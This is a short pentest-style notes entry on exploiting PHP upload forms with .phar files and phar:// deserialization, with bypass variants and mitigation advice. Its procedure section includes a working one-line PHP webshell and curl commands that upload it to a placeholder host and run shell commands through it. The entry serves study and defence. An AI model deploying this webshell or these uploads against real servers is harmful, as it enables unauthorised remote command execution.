---
topic: PHP PHAR upload
tags: [web, php, phar, upload, deserialization, popen]
---

# PHP PHAR upload

**English** | [🇪🇸 Español](php-phar-upload.md)

## Concept

PHP treats `.phar` as an executable file when the server serves it directly. If the upload filter only blocks `.php`, a `.phar` containing PHP code still runs. The `phar://` wrapper can also trigger metadata deserialization when the application uses it to read files.

## When it applies

- An upload form with an extension filter.
- An upload directory reachable over HTTP.
- `disable_functions` without `popen`, `system` or `exec`.
- Use of `phar://` to read or process files.

## Procedure

1. Identify the accepted extension and MIME type.
2. Check whether `.phar` is served as PHP.
3. Create a PHAR with a minimal webshell.
4. Upload it and request the resulting path.
5. If deserialization exists, inspect metadata and available classes.

```bash
cat > sh.phar <<'PHP'
<?php system($_GET['c']); ?>
PHP
curl -b cookies.txt -F "image=@sh.phar" http://<HOST>/upload.php
curl "http://<HOST>/uploads/sh.phar?c=id"
```

## Variants

- Bypass with `.phtml`, `.phar` or a double extension.
- PHAR with serialized metadata for a class with `__destruct`.
- `phar://` over an uploaded file to force deserialization.
- A polyglot PHAR that also passes image validation.

## Limitations

- The server must interpret `.phar` as PHP.
- The upload directory must be reachable.
- Deserialization requires a valid class chain.
- Dangerous functions may be disabled.

## Mitigation and detection

- Validate real content, not only the extension.
- Rename files and store them outside the webroot.
- Block `.phar`, `.phtml` and variants.
- Alert on PHAR headers in uploads and requests to uploaded files.

## References

- <https://www.php.net/manual/en/phar.using.object.php>
- <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
- <https://attack.mitre.org/techniques/T1505/003/>
